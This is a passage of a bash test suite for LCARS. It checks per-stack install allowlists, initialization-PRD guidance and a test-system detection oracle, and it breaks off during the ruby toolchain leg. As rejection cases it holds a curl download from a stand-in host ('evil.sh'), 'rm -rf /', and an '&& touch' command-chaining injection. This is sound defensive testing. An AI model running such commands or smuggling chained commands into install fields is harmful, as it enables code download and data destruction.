#!/usr/bin/env bash
# S186 — THE STACK ARMS: the S147 stamp across the classifier table.
#
# 183-185 built the whole day-zero loop, but every recipe in it was JS/TS. This
# suite pins the SAME shape repeated per arm — rust, go, dotnet, ruby, python,
# jvm — across the three seams that carried a JS-only assumption:
#
#   A. THE INSTALL ALLOWLIST is a TABLE keyed by the repo's stack, each arm
#      admitting ONLY its own package manager. `npm install` on a Rust repo is
#      refused; `cargo add` on a Node repo is refused. The metacharacter guard
#      (S185 salvage DEFECT 5) applies to EVERY arm unchanged, and
#      $LCARS_SETUP_INSTALL_ALLOW_RE still overrides the whole table.
#   B. THE INITIALIZATION PRD carries per-arm guidance on what ESTABLISHING a
#      runner MEANS on that stack — slot descriptions, never copyable commands
#      (S179). The JS/TS PRD is byte-identical to S184's.
#   C. THE FOUNDATION ORACLE sees each ecosystem's MANIFEST-LEVEL evidence of a
#      test system (Gemfile / gemspec test groups, gradle and maven test wiring,
#      python test extras and tests_require), so a repo that HAS a test system
#      is never hard-refused at the filing gate.
#
# TOOLCHAIN HONESTY. The legs that need a real toolchain SKIP loudly when it is
# absent and say so in the tally — `cargo`, `go`, `dotnet` and `ruby` are real on
# the build machine; `java`/`gradle`/`mvn` are not, so the jvm arm is proven here
# as pure string logic only and never pretends a `gradle init` ran.
#
# ZERO worker spend by construction: nothing here spawns a worker, and the legs
# that could run under a PATH shim with COUNTING fakes plus the SPEND FUSE.
set -u

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SCRIPT="${LCARS_RUN_SCRIPT:-$REPO_ROOT/skills/lcars-run/run.sh}"
EV="$REPO_ROOT/skills/lcars-init/establish-vision.sh"
COMMON="$REPO_ROOT/skills/lcars-init/lcars-common.sh"
TMPROOT="$(mktemp -d)"
trap 'rm -rf "$TMPROOT"' EXIT

PASS=0; FAIL=0; SKIP=0
ok()   { PASS=$((PASS+1)); printf '  ok   %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf '  FAIL %s\n' "$1"; }
skip() { SKIP=$((SKIP+1)); printf '  skip %s\n' "$1"; }

# --- SPEND FUSE (S182 rig.sh contract, verbatim) ----------------------------
SHIM="$TMPROOT/shim"; SPEND_LOG="$TMPROOT/spend.log"
mkdir -p "$SHIM"; : > "$SPEND_LOG"
for b in claude copilot; do
  cat > "$SHIM/$b" <<SH
#!/usr/bin/env bash
case " \$* " in
  *" --version "*|*" -v "*) echo "0.0.0-s186-fake (counting shim)"; exit 0 ;;
esac
printf 'SPAWN\t%s\n' "\$(basename "\$0")" >> "$SPEND_LOG"
exit 0
SH
  chmod +x "$SHIM/$b"
done
[ -x "$SHIM/claude" ] && [ -x "$SHIM/copilot" ] || {
  echo "SPEND FUSE: counting fakes missing — refusing to run"; exit 1; }

# ===========================================================================
# THE ARM TABLE — the per-arm recipe this suite is the stamp of.
# ===========================================================================
# One row per arm: the marker file that makes a repo THAT stack, an install
# command that arm must ACCEPT, and a second one for good measure. Every other
# arm's accepted command must be REFUSED on this arm — that is the 7x7 matrix
# below, and it is what stops the stamp from becoming five parallel inventions.
ARMS="js rust go dotnet ruby python jvm"

arm_marker_file() { # arm → the file that makes a repo that stack
  case "$1" in
    js)     printf 'package.json' ;;
    rust)   printf 'Cargo.toml' ;;
    go)     printf 'go.mod' ;;
    dotnet) printf 'App.csproj' ;;
    ruby)   printf 'Gemfile' ;;
    python) printf 'pyproject.toml' ;;
    jvm)    printf 'build.gradle' ;;
  esac
}
arm_marker_body() { # arm → what to write into it
  case "$1" in
    js)     printf '{ "name": "app" }\n' ;;
    rust)   printf '[package]\nname = "app"\nversion = "0.1.0"\n' ;;
    go)     printf 'module app\n\ngo 1.21\n' ;;
    dotnet) printf '<Project Sdk="Microsoft.NET.Sdk"></Project>\n' ;;
    ruby)   printf "source 'https://rubygems.org'\n" ;;
    python) printf '[project]\nname = "app"\n' ;;
    jvm)    printf 'plugins { id "java" }\n' ;;
  esac
}
arm_install_cmds() { # arm → the install commands this arm MUST accept, one per line
  case "$1" in
    js)     printf 'npm install --save-dev vitest\npnpm add -D jest\nyarn add --dev mocha\nbun add -d vitest\n' ;;
    rust)   printf 'cargo add --dev proptest\nrustup component add clippy\n' ;;
    go)     printf 'go get -t github.com/stretchr/testify\ngo mod tidy\n' ;;
    dotnet) printf 'dotnet new xunit -o App.Tests\ndotnet add App.Tests reference App.csproj\ndotnet sln add App.Tests\ndotnet restore\n' ;;
    ruby)   printf 'gem install rspec\nbundle install\nbundle add minitest\n' ;;
    python) printf 'pip install pytest\npython3 -m pip install pytest\nuv add --dev pytest\npoetry add --group dev pytest\n' ;;
    jvm)    printf 'gradle init --type java-library\nmvn archetype:generate -DarchetypeArtifactId=maven-archetype-quickstart\n./gradlew wrapper\n' ;;
  esac
}

# --- the pure allowlist hook: arm resolution + pattern, no mission needed ----
allow_for() { # repo-dir [setup-dir] → prints ARM=<id> and ALLOW=<ere>
  ( cd "$1" && env LCARS_GP_ROOT="$1" bash "$SCRIPT" setup-allow-re-test \
        --setup "${2:-$TMPROOT/sd-empty}" 2>&1 )
}
mkdir -p "$TMPROOT/sd-empty"

arm_repo() { # arm → a repo dir carrying only that arm's marker
  local a="$1" d; d="$(mktemp -d "$TMPROOT/repo-$a.XXXX")"
  ( cd "$d" && git init -q && git config user.email t@t && git config user.name t )
  arm_marker_body "$a" > "$d/$(arm_marker_file "$a")"
  printf '%s' "$d"
}

echo "== A. the per-arm install allowlist (the table) =="

# A1. Every arm RESOLVES from the marker file the classifier already keys off —
#     no second stack taxonomy, `detect_stack`'s vocabulary and nothing else.
for a in $ARMS; do
  r="$(arm_repo "$a")"
  got="$(allow_for "$r" | sed -n 's/^ARM=//p' | tail -1)"
  if [ "$got" = "$a" ]; then
    ok "A1-$a. a repo marked by $(arm_marker_file "$a") resolves to the $a arm"
  else
    bad "A1-$a. resolved to '$got', not '$a'"
  fi
done

# A2 / A3. THE MATRIX. Each arm accepts its OWN install commands and REFUSES
#          every other arm's. This is the whole point of the table.
for a in $ARMS; do
  r="$(arm_repo "$a")"
  allow="$(allow_for "$r" | sed -n 's/^ALLOW=//p' | tail -1)"
  self_ok=1
  while IFS= read -r c; do
    [ -n "$c" ] || continue
    printf '%s' "$c" | grep -Eq "$allow" || { self_ok=0; printf '       (%s rejected its own: %s)\n' "$a" "$c"; }
  done <<EOF
$(arm_install_cmds "$a")
EOF
  if [ "$self_ok" = 1 ]; then
    ok "A2-$a. the $a arm accepts its own install commands"
  else
    bad "A2-$a. the $a arm refuses an install command of its own ecosystem"
  fi

  cross_ok=1
  for b in $ARMS; do
    [ "$b" = "$a" ] && continue
    while IFS= read -r c; do
      [ -n "$c" ] || continue
      if printf '%s' "$c" | grep -Eq "$allow"; then
        cross_ok=0; printf '       (%s accepted %s command: %s)\n' "$a" "$b" "$c"
      fi
    done <<EOF
$(arm_install_cmds "$b")
EOF
  done
  if [ "$cross_ok" = 1 ]; then
    ok "A3-$a. …and REFUSES every other arm's install commands"
  else
    bad "A3-$a. the $a arm accepted a foreign ecosystem's install command"
  fi
done

# A4. THE JS ARM IS BYTE-IDENTICAL to the single hardcoded pattern S111 shipped
#     and S185 left alone. The stamp widens the table; it never edits the row
#     that was already there.
r="$(arm_repo js)"
allow="$(allow_for "$r" | sed -n 's/^ALLOW=//p' | tail -1)"
if [ "$allow" = '^(pnpm|npm|yarn|bun)[[:space:]]' ]; then
  ok "A4. the js row is byte-identical to the pre-S186 hardcoded pattern"
else
  bad "A4. the js pattern CHANGED: '$allow'"
fi

# A5. $LCARS_SETUP_INSTALL_ALLOW_RE still overrides the whole table (the escape
#     hatch every existing suite drives through).
r="$(arm_repo rust)"
allow="$( cd "$r" && env LCARS_SETUP_INSTALL_ALLOW_RE='^bash ' \
          bash "$SCRIPT" setup-allow-re-test --setup "$TMPROOT/sd-empty" 2>&1 \
          | sed -n 's/^ALLOW=//p' | tail -1 )"
if [ "$allow" = '^bash ' ]; then
  ok "A5. LCARS_SETUP_INSTALL_ALLOW_RE overrides the table"
else
  bad "A5. the override was ignored (got '$allow')"
fi

# A6. AN UNRESOLVED STACK IS PERMISSIVE, NOT JS-ONLY. A blank repo with no
#     marker at all cannot be attributed to an arm; refusing every install there
#     would strand the very repo this round exists for. The union of the table
#     is the honest answer — still one plain invocation, still metacharacter-
#     guarded, still probe-verified.
r="$(mktemp -d "$TMPROOT/repo-blank.XXXX")"
( cd "$r" && git init -q && git config user.email t@t && git config user.name t )
allow="$(allow_for "$r" | sed -n 's/^ALLOW=//p' | tail -1)"
u_ok=1
for a in $ARMS; do
  while IFS= read -r c; do
    [ -n "$c" ] || continue
    printf '%s' "$c" | grep -Eq "$allow" || { u_ok=0; printf '       (union rejected: %s)\n' "$c"; }
  done <<EOF
$(arm_install_cmds "$a")
EOF
done
if [ "$u_ok" = 1 ]; then
  ok "A6. an unattributable repo falls back to the UNION of the table"
else
  bad "A6. the unknown-stack fallback refuses a legitimate install"
fi
# …and the union is still an ALLOWLIST, not a hole.
if printf '%s' "curl http://evil.sh -o x" | grep -Eq "$allow" \
   || printf '%s' "rm -rf /" | grep -Eq "$allow"; then
  bad "A6b. the union fallback admits a non-package-manager command"
else
  ok "A6b. …and the union is still an allowlist (arbitrary commands refused)"
fi

# A7. THE STACK IS READ FROM THE DECLARED SETUP TOO. On a genuinely blank repo
#     the only evidence of the ecosystem is the manifest the scaffold ticket is
#     ADDING — so the arm is resolved from it when the tree itself is silent.
sd="$TMPROOT/sd-rust"; mkdir -p "$sd"
arm_marker_body rust > "$sd/Cargo.toml"
got="$(allow_for "$r" "$sd" | sed -n 's/^ARM=//p' | tail -1)"
if [ "$got" = "rust" ]; then
  ok "A7. a blank repo takes its arm from the manifest the setup declares"
else
  bad "A7. declared-manifest arm resolution failed (got '$got')"
fi

echo "== B. the guards that must hold on EVERY arm =="

# The metacharacter guard is the S185 salvage's DEFECT 5 fix. It is not per-arm
# and must never become per-arm: a table of seven patterns is seven chances to
# reintroduce the hole `npm --version && touch /tmp/PWNED` walked through.
new_mission_repo() { # arm → repo with an initialization mission at m-001/t-scaffold
  local a="$1" r; r="$(arm_repo "$a")"
  ( cd "$r" && printf '# ctx\n' > CONTEXT.md && git add -A && git commit -qm init )
  mkdir -p "$r/.git/lcars/missions/m-001/tickets/t-scaffold"
  cat > "$r/.git/lcars/missions/m-001/state.json" <<'JSON'
{ "id": "m-001", "type": "feature", "title": "t", "stage": "implement",
  "missionType": "initialization" }
JSON
  cat > "$r/.git/lcars/missions/m-001/approved-plan.json" <<'JSON'
{ "tickets": [ { "id": "t-scaffold", "title": "establish the test system",
                 "description": "d", "acceptanceCriteria": ["a runner runs"] } ] }
JSON
  printf '%s' "$r"
}
apply_setup() { # repo manifest setup-dir pkg extra-env... -> ASRC + ASNOTE
  local r="$1" mf="$2" sd="$3" pkg="$4"; shift 4
  OUT="$( cd "$r" && env PATH="$SHIM:$PATH" LCARS_GH_BIN=true LCARS_GIT_BIN=git "$@" \
          bash "$SCRIPT" apply-declared-setup-test --mission m-001 --ticket t-scaffold \
               --result "$mf" --setup "$sd" "$pkg" 2>&1 )"
  ASRC="$(printf '%s\n' "$OUT" | sed -n 's/^ASRC=//p' | tail -1)"
  ASNOTE="$(printf '%s\n' "$OUT" | sed -n 's/^ASNOTE=//p' | tail -1)"
}

for a in $ARMS; do
  repo="$(new_mission_repo "$a")"
  pwned="$TMPROOT/pwned-$a-$$"; rm -f "$pwned"
  # The FIRST token is this arm's own, so only the metacharacter guard can
  # refuse it — exactly the shape that was accepted AND executed before S185.
  first="$(arm_install_cmds "$a" | head -1)"
  printf '{ "package": "", "gap": "no runner", "installCommand": "%s && touch %s" }\n' \
    "$first" "$pwned" > "$TMPROOT/mf-meta-$a.json"
  apply_setup "$repo" "$TMPROOT/mf-meta-$a.json" "$TMPROOT/sd-empty" "" LCARS_SETUP_GREENFIELD=1
  if [ "$ASRC" != 0 ] && printf '%s' "$ASNOTE" | grep -q 'metacharacter' && [ ! -e "$pwned" ]; then
    ok "B1-$a. a chained install is REFUSED and NOT EXECUTED on the $a arm"
  else
    bad "B1-$a. metacharacter guard missed the $a arm (rc=$ASRC note=$ASNOTE)"
  fi
done

# B2. A FOREIGN INSTALL IS REFUSED THROUGH THE REAL apply_declared_setup, not
#     merely by the pattern in isolation.
repo="$(new_mission_repo rust)"
printf '{ "package": "", "gap": "no runner", "installCommand": "npm install --save-dev vitest" }\n' \
  > "$TMPROOT/mf-foreign.json"
apply_setup "$repo" "$TMPROOT/mf-foreign.json" "$TMPROOT/sd-empty" "" LCARS_SETUP_GREENFIELD=1
if [ "$ASRC" != 0 ] && printf '%s' "$ASNOTE" | grep -q 'installCommand'; then
  ok "B2. a Rust repo refuses an npm install through the real apply path"
else
  bad "B2. the rust arm accepted npm (rc=$ASRC note=$ASNOTE)"
fi
repo="$(new_mission_repo js)"
printf '{ "package": "", "gap": "no runner", "installCommand": "cargo add --dev proptest" }\n' \
  > "$TMPROOT/mf-foreign2.json"
apply_setup "$repo" "$TMPROOT/mf-foreign2.json" "$TMPROOT/sd-empty" "" LCARS_SETUP_GREENFIELD=1
if [ "$ASRC" != 0 ] && printf '%s' "$ASNOTE" | grep -q 'installCommand'; then
  ok "B2b. …and a Node repo refuses a cargo install"
else
  bad "B2b. the js arm accepted cargo (rc=$ASRC note=$ASNOTE)"
fi

echo "== C. per-arm foundation guidance in the initialization PRD =="

prd_for() { # stack-string → the PRD ev_prd writes
  printf 'an idea\n' > "$TMPROOT/idea.txt"
  bash "$EV" --prd --idea "$TMPROOT/idea.txt" --stack "$1" \
       --slice "a row is saved and read back" 2>&1
}

# C1. Each arm's PRD says what ESTABLISHING A RUNNER MEANS on that stack.
#     Keyed on the CAPTAIN'S ACCEPTED STACK STRING, which is prose, not an id.
c_expect() { # arm → a phrase the guidance must carry
  case "$1" in
    dotnet) printf 'test project' ;;
    ruby)   printf 'name which' ;;
    jvm)    printf 'build tool' ;;
    rust)   printf 'ships with the toolchain' ;;
    go)     printf 'ships with the toolchain' ;;
    python) printf 'name the runner' ;;
  esac
}
c_stack_string() { # arm → what a captain would actually accept
  case "$1" in
    dotnet) printf '.NET 8 + xUnit' ;;
    ruby)   printf 'Ruby on Rails' ;;
    jvm)    printf 'Java + Spring Boot' ;;
    rust)   printf 'Rust + Axum' ;;
    go)     printf 'Go + chi' ;;
    python) printf 'Python + FastAPI' ;;
  esac
}
for a in dotnet ruby jvm rust go python; do
  out="$(prd_for "$(c_stack_string "$a")")"
  if printf '%s' "$out" | grep -qi "$(c_expect "$a")"; then
    ok "C1-$a. the PRD carries $a-specific guidance on establishing the runner"
  else
    bad "C1-$a. no $a guidance in the PRD (wanted /$(c_expect "$a")/)"
  fi
done

# C2. S179 DISCIPLINE — SLOT DESCRIPTIONS, NOTHING COPYABLE. S179 exists
#     because exemplars written as literal commands were pasted verbatim into
#     the product. The guidance describes the slot to fill; it must not hand a
#     model a command line to copy.
for a in dotnet ruby jvm rust go python; do
  out="$(prd_for "$(c_stack_string "$a")")"
  # Everything from the "Establishing the test system" block onward.
  blk="$(printf '%s' "$out" | sed -n '/Establishing the test system/,/^## Context/p')"
  if [ -z "$blk" ]; then
    bad "C2-$a. no guidance block found at all"
  elif printf '%s' "$blk" | grep -Eq 'dotnet new|cargo (init|new|add)|go mod init|gradle init|mvn archetype|gem install|bundle (add|install)|pip install|npm (install|i) |python3? -m (pip|unittest)'; then
    bad "C2-$a. the guidance contains a COPYABLE command line (S179)"
  else
    ok "C2-$a. the $a guidance is a slot description, nothing copyable"
  fi
done

# C3. RUBY MUST CHOOSE. A declaration naming neither rspec nor minitest is not a
#     foundation — the PRD says so, in the acceptance criteria a planner reads.
out="$(prd_for 'Ruby on Rails')"
if printf '%s' "$out" | grep -qi 'neither' && printf '%s' "$out" | grep -qi 'sent back\|bounced\|not a foundation'; then
  ok "C3. the ruby PRD states that naming neither framework is a rejection"
else
  bad "C3. the ruby PRD does not force the rspec/minitest choice"
fi

# C4. PYTHON: THE ZERO-INSTALL RUNNER IS THE SAFE DEFAULT, and LCARS never
#     tells anyone to break a managed interpreter to get one. `pip install
#     pytest` HARD-FAILS on a PEP-668 machine (measured, this build machine);
#     the standard library's runner needs no install at all.
out="$(prd_for 'Python + FastAPI')"
if printf '%s' "$out" | grep -qi 'standard library'; then
  ok "C4. the python guidance points at the zero-install standard-library runner"
else
  bad "C4. the python guidance does not name the zero-install runner"
fi
if printf '%s' "$out" | grep -q 'break-system-packages'; then
  bad "C4b. the PRD suggests overriding a managed interpreter"
else
  ok "C4b. …and never suggests overriding a managed interpreter"
fi

# C5. RUST / GO: NOTHING TO INSTALL. The guidance must say so — a declared
#     install command on these arms is a sign the mission misread its stack.
for a in rust go; do
  out="$(prd_for "$(c_stack_string "$a")")"
  if printf '%s' "$out" | grep -qi 'nothing to install'; then
    ok "C5-$a. the $a guidance says there is nothing to install"
  else
    bad "C5-$a. the $a guidance does not say the runner ships with the toolchain"
  fi
done

# C6. THE JS/TS PRD IS BYTE-IDENTICAL. The stamp adds arms; it does not edit the
#     one S184 shipped and S185 drove.
js_prd="$(prd_for 'Vite + React + Vitest')"
if printf '%s' "$js_prd" | grep -q 'Establishing the test system'; then
  bad "C6. the JS/TS PRD gained a per-arm block — the JS path is not byte-identical"
else
  ok "C6. the JS/TS PRD is unchanged (no per-arm block on the js arm)"
fi
# …and it still says everything S184 promised.
if printf '%s' "$js_prd" | grep -q 'A TEST SYSTEM is installed and wired for Vite + React + Vitest'; then
  ok "C6b. …and its stack-generic acceptance criteria are intact"
else
  bad "C6b. the JS/TS acceptance criteria changed"
fi

echo "== D. per-arm verdicts from the foundation oracle =="

# The oracle decides on POSITIVE EVIDENCE ONLY and errs toward `unconfigured`:
# refusing a repo that HAS a test system strands a captain, while letting one
# through is caught downstream by S182's wall. Each arm below gets BOTH halves of
# behaviour 5 — a TESTED fixture that must read `unconfigured` (or better), and
# an UNTESTED one that must not.
#
# WHAT "UNTESTED" MEANS PER ARM IS NOT THE SAME SHAPE, and pretending otherwise
# would have produced three wrong assertions here. On rust / go / python the
# manifest ALONE already yields a runner (`_dtc_rust`, `_dtc_go`, `_dtc_python`
# answer `cargo test` / `go test ./...` / `pytest` from Cargo.toml / go.mod /
# pyproject.toml), so a crate or module is never "untested" — which is the same
# fact the rust/go recipe rests on: the runner ships with the toolchain. Their
# untested counterpart is therefore SOURCE WITHOUT A MANIFEST. On ruby / jvm /
# dotnet the manifest carries no runner of its own, so the discriminator is the
# test wiring INSIDE it — and that is exactly where S186's new evidence lands.
fnd() { # repo → the foundation verdict + why, tab-separated
  ( cd "$1" && bash -c '
      . "'"$COMMON"'"
      TOPLEVEL="'"$1"'"
      lcars_test_readiness "'"$1"'/.git/lcars/config.json" >/dev/null 2>&1
      printf "%s\t%s\n" "$LCARS_TESTREADY_FOUNDATION" "$LCARS_TESTREADY_FOUNDATION_WHY"' )
}
mk() { # name → a fresh empty git repo
  local d; d="$(mktemp -d "$TMPROOT/fnd-$1.XXXX")"
  ( cd "$d" && git init -q && git config user.email t@t && git config user.name t )
  printf '%s' "$d"
}
expect_fnd() { # repo  wanted-prefix…  label
  local r="$1" label="$2"; shift 2
  local v; v="$(fnd "$r")"; local got="${v%%	*}"
  local w
  for w in "$@"; do [ "$got" = "$w" ] && { ok "$label"; return 0; }; done
  bad "$label — read '$got' (why: ${v#*	})"
}

# D1. RUST — the toolchain IS the test system, so a crate always has one.
d="$(mk rustdev)"
printf '[package]\nname = "app"\n\n[dev-dependencies]\nproptest = "1"\n' > "$d/Cargo.toml"
mkdir -p "$d/src"; printf 'pub fn add(a: i32) -> i32 { a }\n' > "$d/src/lib.rs"
expect_fnd "$d" "D1a. a Cargo crate with dev-dependencies has a test system" unconfigured ready

d="$(mk rustinline)"
printf '[package]\nname = "app"\n' > "$d/Cargo.toml"
mkdir -p "$d/src"
printf 'pub fn add(a: i32) -> i32 { a }\n\n#[cfg(test)]\nmod tests {\n  #[test]\n  fn works() { assert_eq!(1, 1); }\n}\n' > "$d/src/lib.rs"
expect_fnd "$d" "D1b. …including one whose only tests are inline #[cfg(test)] in src/" unconfigured ready

# …and the untested counterpart: Rust SOURCE with no crate manifest at all.
d="$(mk rustbare)"
mkdir -p "$d/src"; printf 'pub fn add(a: i32) -> i32 { a }\n' > "$d/src/lib.rs"
expect_fnd "$d" "D1c. …but loose Rust source with no manifest is untested" untested

# D2. GO — same shape: `go test` ships with the toolchain.
d="$(mk go)"
printf 'module app\n\ngo 1.21\n' > "$d/go.mod"
printf 'package app\n\nfunc Add(a int) int { return a }\n' > "$d/app.go"
printf 'package app\n\nimport "testing"\n\nfunc TestAdd(t *testing.T) { _ = Add(1) }\n' > "$d/app_test.go"
expect_fnd "$d" "D2a. a Go module with a _test.go file has a test system" unconfigured ready
d="$(mk gobare)"
printf 'package app\n\nfunc Add(a int) int { return a }\n' > "$d/app.go"
expect_fnd "$d" "D2b. …but loose Go source with no go.mod is untested" untested

# D3. RUBY — the manifest carries no runner, so the TEST WIRING in it decides.
d="$(mk rubygroup)"
printf "source 'https://rubygems.org'\n\ngroup :test do\n  gem 'rspec'\nend\n" > "$d/Gemfile"
printf 'def add(a); a; end\n' > "$d/app.rb"
expect_fnd "$d" "D3a. a Gemfile :test group is a test system" unconfigured ready
d="$(mk gemspec)"
printf 'Gem::Specification.new do |s|\n  s.name = "app"\n  s.add_development_dependency "minitest"\nend\n' > "$d/app.gemspec"
printf 'def add(a); a; end\n' > "$d/app.rb"
expect_fnd "$d" "D3b. a gemspec add_development_dependency on a test framework is one too" unconfigured ready
d="$(mk rubybare)"
printf "source 'https://rubygems.org'\ngem 'sinatra'\n" > "$d/Gemfile"
printf 'def add(a); a; end\n' > "$d/app.rb"
expect_fnd "$d" "D3c. …and a Gemfile with no test gem is untested" untested

# D4. JVM — the build tool's test wiring, in either DSL, or maven's test scope.
d="$(mk gradle)"
printf 'plugins { id "java" }\n\ndependencies {\n  testImplementation "org.junit.jupiter:junit-jupiter:5.10.0"\n}\n' > "$d/build.gradle"
mkdir -p "$d/src/main/java"; printf 'class App {}\n' > "$d/src/main/java/App.java"
expect_fnd "$d" "D4a. gradle testImplementation is a test system" unconfigured ready
d="$(mk gradlekts)"
printf 'plugins { java }\n\ntasks.named("test") { useJUnitPlatform() }\n' > "$d/build.gradle.kts"
mkdir -p "$d/src/main/kotlin"; printf 'class App\n' > "$d/src/main/kotlin/App.kt"
expect_fnd "$d" "D4b. …and so is a Kotlin-DSL build wiring the JUnit platform" unconfigured ready
d="$(mk maven)"
cat > "$d/pom.xml" <<'XML'
<project><dependencies><dependency>
  <groupId>org.junit.jupiter</groupId><artifactId>junit-jupiter</artifactId>
  <scope>test</scope>
</dependency></dependencies></project>
XML
mkdir -p "$d/src/main/java"; printf 'class App {}\n' > "$d/src/main/java/App.java"
expect_fnd "$d" "D4c. a maven test-scoped dependency is a test system" unconfigured ready
d="$(mk gradlebare)"
printf 'plugins { id "java" }\n\ndependencies {\n  implementation "com.google.guava:guava:33.0.0-jre"\n}\n' > "$d/build.gradle"
mkdir -p "$d/src/main/java"; printf 'class App {}\n' > "$d/src/main/java/App.java"
expect_fnd "$d" "D4d. …and a gradle build with no test wiring is untested" untested

# D5. PYTHON — pyproject already yields a runner, so the untested counterpart is
#     loose .py source. The new evidence is what an EXTRA / tests_require adds.
d="$(mk pyproj)"
printf '[project]\nname = "app"\n\n[project.optional-dependencies]\ntest = ["pytest"]\n' > "$d/pyproject.toml"
printf 'def add(a):\n    return a\n' > "$d/app.py"
expect_fnd "$d" "D5a. a pyproject test extra is a test system" unconfigured ready
d="$(mk setuppy)"
printf 'from setuptools import setup\nsetup(name="app", tests_require=["pytest"])\n' > "$d/setup.py"
printf 'def add(a):\n    return a\n' > "$d/app.py"
expect_fnd "$d" "D5b. setup.py tests_require is a test system" unconfigured ready
d="$(mk pybare)"
printf 'def add(a):\n    return a\n' > "$d/app.py"
expect_fnd "$d" "D5c. …but loose python source with no manifest is untested" untested

# D6. DOTNET — already covered by detect_dotnet_test_projects (a Test.Sdk
#     reference, or the *Tests* naming convention). Pinned so the stamp records
#     that this arm needed nothing added.
d="$(mk dotnet)"
mkdir -p "$d/App" "$d/App.Tests"
printf '<Project Sdk="Microsoft.NET.Sdk"></Project>\n' > "$d/App/App.csproj"
cat > "$d/App.Tests/App.Tests.csproj" <<'XML'
<Project Sdk="Microsoft.NET.Sdk"><ItemGroup>
  <PackageReference Include="Microsoft.NET.Test.Sdk" Version="17.11.1" />
  <PackageReference Include="xunit" Version="2.9.0" />
</ItemGroup></Project>
XML
printf 'public class C {}\n' > "$d/App/C.cs"
expect_fnd "$d" "D6a. a csproj referencing Microsoft.NET.Test.Sdk is a test system" unconfigured ready
d="$(mk dotnetbare)"
mkdir -p "$d/App"
printf '<Project Sdk="Microsoft.NET.Sdk"></Project>\n' > "$d/App/App.csproj"
printf 'public class C {}\n' > "$d/App/C.cs"
expect_fnd "$d" "D6b. …and a lone app csproj is not one" untested greenfield

# D7. THE JS ORACLE IS UNCHANGED (regression) — including its impostor filter.
d="$(mk js)"
printf '{ "name": "app", "devDependencies": { "vitest": "^1" } }\n' > "$d/package.json"
printf 'export const add = a => a;\n' > "$d/index.js"
expect_fnd "$d" "D7a. a package.json devDependency is still a test system" unconfigured ready
d="$(mk jsbare)"
printf '{ "name": "app", "scripts": { "test": "echo \\"Error: no test specified\\" && exit 1" } }\n' > "$d/package.json"
printf 'export const add = a => a;\n' > "$d/index.js"
expect_fnd "$d" "D7b. …and npm's default test script is still not one" untested


echo "== E. REAL TOOLCHAINS — the arms this machine can actually run =="

# The honesty rule for this session: an arm proven only on a transcript is NOT
# proven. These legs run the REAL toolchain or skip loudly.

# E1. RUST — zero install. `cargo init` + `cargo test` on the real toolchain,
#     then LCARS's own detector must find the command, which is the whole of
#     behaviour 4: detection alone gets ticket 2 a real gate.
if command -v cargo >/dev/null 2>&1; then
  d="$(mk realrust)"
  ( cd "$d" && cargo init --lib --name probe -q >/dev/null 2>&1 )
  if ( cd "$d" && cargo test --offline >/dev/null 2>&1 ); then
    ok "E1a. REAL cargo: a fresh crate's tests run with NO install command"
  else
    bad "E1a. cargo test failed on a fresh crate"
  fi
  cmd="$( cd "$d" && env LCARS_GP_ROOT="$d" bash "$SCRIPT" greenfield-detect-cmd-test 2>&1 | sed -n 's/^DETECTED=//p' | tail -1 )"
  if printf '%s' "$cmd" | grep -q 'cargo test'; then
    ok "E1b. …and LCARS detects \`$cmd\` at the root, so ticket 2 gets a real gate"
  else
    bad "E1b. LCARS detected no cargo test command (got '$cmd')"
  fi
  v="$(fnd "$d")"
  case "$v" in unconfigured*|ready*) ok "E1c. …and the oracle calls the crate tested" ;;
    *) bad "E1c. a real tested crate read as '${v%%	*}'" ;; esac
else
  skip "E1. rust — no cargo on this machine (transcript only)"
fi

# E2. GO — zero install, same shape.
if command -v go >/dev/null 2>&1; then
  d="$(mk realgo)"
  ( cd "$d" && go mod init probe >/dev/null 2>&1 )
  printf 'package probe\n\nfunc Add(a int) int { return a + 1 }\n' > "$d/probe.go"
  printf 'package probe\n\nimport "testing"\n\nfunc TestAdd(t *testing.T) {\n  if Add(1) != 2 { t.Fatal("no") }\n}\n' > "$d/probe_test.go"
  if ( cd "$d" && go test ./... >/dev/null 2>&1 ); then
    ok "E2a. REAL go: the toolchain's own test runner works with NO install"
  else
    bad "E2a. go test failed on a fresh module"
  fi
  cmd="$( cd "$d" && env LCARS_GP_ROOT="$d" bash "$SCRIPT" greenfield-detect-cmd-test 2>&1 | sed -n 's/^DETECTED=//p' | tail -1 )"
  if printf '%s' "$cmd" | grep -q 'go test'; then
    ok "E2b. …and LCARS detects \`$cmd\` at the root"
  else
    bad "E2b. LCARS detected no go test command (got '$cmd')"
  fi
else
  skip "E2. go — no go toolchain on this machine (transcript only)"
fi

# E3. DOTNET — behaviour 2, on the real SDK: the declared `dotnet new xunit`
#     plus a project reference is admitted by the table AND actually works.
if command -v dotnet >/dev/null 2>&1; then
  repo="$(new_mission_repo dotnet)"
  allow="$(allow_for "$repo" | sed -n 's/^ALLOW=//p' | tail -1)"
  ok_all=1
  for c in "dotnet new xunit -o App.Tests" "dotnet add App.Tests reference App.csproj"; do
    printf '%s' "$c" | grep -Eq "$allow" || ok_all=0
  done
  if [ "$ok_all" = 1 ]; then
    ok "E3a. the dotnet arm admits \`dotnet new xunit\` and the project reference"
  else
    bad "E3a. the dotnet arm refuses its own scaffold commands"
  fi
  d="$(mk realdotnet)"
  if ( cd "$d" && dotnet new xunit -n ProbeTests -o ProbeTests >/dev/null 2>&1 ) \
     && ( cd "$d" && dotnet test ProbeTests >/dev/null 2>&1 ); then
    ok "E3b. REAL dotnet SDK: the declared test project is created AND its suite passes"
  else
    bad "E3b. the real dotnet scaffold+test cycle failed"
  fi
  v="$(fnd "$d")"
  case "$v" in unconfigured*|ready*) ok "E3c. …and the oracle sees the created test project" ;;
    *) bad "E3c. a real xunit project read as '${v%%	*}'" ;; esac
else
  skip "E3. dotnet — no SDK on this machine (transcript only)"
fi

# E4. RUBY — both runners are real here. The arm admits both install shapes, and
#     the PRD's forced CHOICE is what keeps a declaration naming neither out.
if command -v ruby >/dev/null 2>&1; then
  repo="$(new_mission_repo ruby)"
  allow="$(allow_for "$repo" | sed -n 's/^ALLOW=//p' | tail -1)"
  if printf '%s' "gem install rspec" | grep -Eq "$allow" \
     && printf '%s' "bundle add minitest" | grep -Eq "$allow"; then
    ok "E4a. the ruby arm admits both the gem and bundler install shapes"
  else
    bad "E4a. the ruby arm refuses a real ruby install command"
  fi
  d="$(mk realruby)"
  mkdir -p "$d/test"
